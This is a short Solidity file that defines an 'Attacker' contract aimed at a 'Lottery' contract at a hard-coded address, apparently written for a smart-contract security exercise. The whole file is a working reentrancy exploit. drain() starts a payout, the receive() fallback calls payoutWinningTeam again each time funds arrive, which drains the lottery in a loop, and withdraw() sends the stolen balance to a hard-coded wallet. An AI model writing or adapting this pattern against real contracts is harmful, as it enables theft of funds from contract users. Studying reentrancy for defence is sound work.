// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.0;

import "./lottery.sol";

contract Attacker {
    Lottery lo = Lottery(0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A);

    // drain function is called once
    function drain() public {
        // lo.makeAGuess(address(this), or.getRandomNumber());
        lo.payoutWinningTeam(address(this));
    }

    // See https://ethereum.stackexchange.com/a/81995
    // receive() is called in a loop when the lottery smart contract makes the call without data.
    receive() external payable {
        lo.payoutWinningTeam(address(this));
    }

    // To withdraw all the funds from this contract to my own wallet
    function withdraw() external {
        payable(address(0x65726dAc1F98eF7A18082E0FAcf6b8EbD0D4Dc31)).transfer(
            address(this).balance
        );
    }
}
